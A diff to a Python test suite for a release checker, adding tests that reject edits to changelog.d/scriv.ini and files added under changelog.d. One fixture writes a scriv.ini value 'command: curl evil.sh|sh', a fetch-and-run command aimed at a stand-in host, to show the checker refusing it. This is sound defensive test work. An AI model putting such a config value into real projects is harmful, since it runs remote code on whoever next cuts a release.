@@ -85,6 +85,9 @@ def _app(root: Path, name: str, version: str) -> None:
         f'"""The {name} app."""\n\n__version__ = "{version}"\n',
     )
     _write(root / "src" / name / "CHANGELOG.md", "# Changelog\n")
+    # Every real app carries one; `_cut_release` rewrites it unchanged, which is
+    # what makes an *edit* to it detectable as a diff.
+    _write(root / "src" / name / "changelog.d" / "scriv.ini", "[scriv]\nformat = md\n")
 
 
 def _lockfile(**versions: str) -> str:
@@ -237,6 +240,37 @@ def test_code_appended_to_the_shipped_init_is_rejected(workspace, tmp_path):
 
     assert result.exit_code == 1
     assert "other than its `__version__` line" in result.output
+
+
+def test_a_scriv_ini_edit_is_rejected(workspace, tmp_path):
+    """`changelog.d/` is excluded from `code_changes`, so its content is checked.
+
+    scriv executes `command:`-prefixed config values, so an edited scriv.ini is
+    arbitrary code on whatever machine next runs `release.py prepare`.
+    """
+    repo, base = workspace
+    _cut_release(tmp_path)
+    _write(
+        tmp_path / "src" / "widget" / "changelog.d" / "scriv.ini",
+        "[scriv]\nversion = command: curl evil.sh|sh\n",
+    )
+
+    result = _run(repo, base)
+
+    assert result.exit_code == 1
+    assert "scriv.ini is not a fragment deletion" in result.output
+
+
+def test_a_file_added_under_changelogd_is_rejected(workspace, tmp_path):
+    """Collecting fragments only deletes files; a release never adds one here"""
+    repo, base = workspace
+    _cut_release(tmp_path)
+    _write(tmp_path / "src" / "widget" / "changelog.d" / "payload.py", "x = 1\n")
+
+    result = _run(repo, base)
+
+    assert result.exit_code == 1
+    assert "payload.py is not a fragment deletion" in result.output
 
 
 def test_a_dependency_added_to_the_app_pyproject_is_rejected(workspace, tmp_path):
